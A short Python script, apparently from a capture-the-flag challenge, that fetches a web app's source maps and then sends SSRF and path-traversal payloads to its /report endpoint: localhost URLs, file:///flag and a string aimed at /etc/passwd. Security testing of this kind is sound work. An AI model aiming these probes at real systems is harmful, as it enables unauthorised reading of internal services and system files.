import requests
base = "https://polynomial.secso.cc"
for p in ["/assets/index-0OGNtCbS.js.map", "/assets/index-C55u8Rdf.css.map"]:
    r = requests.get(base+p, timeout=20)
    print(p, "->", r.status_code, "len", len(r.text), "ctype", r.headers.get("content-type"))
    if r.status_code==200 and "sourcesContent" in r.text or (r.status_code==200 and len(r.text)<430):
        pass
    if r.status_code==200 and r.headers.get("content-type","").startswith(("application/json","text/plain")):
        open("/work/bundle.js.map","w",encoding="utf-8").write(r.text)
        print("   saved map; first 300:", r.text[:300])

# SSRF / report probing
print("="*50)
for payload in ["http://127.0.0.1/", "file:///flag", "http://localhost/flag", "/../../etc/passwd"]:
    r = requests.post(base+"/report", data={"url":payload}, timeout=20, allow_redirects=False)
    print("report", payload, "->", r.status_code, repr(r.text[:120]))
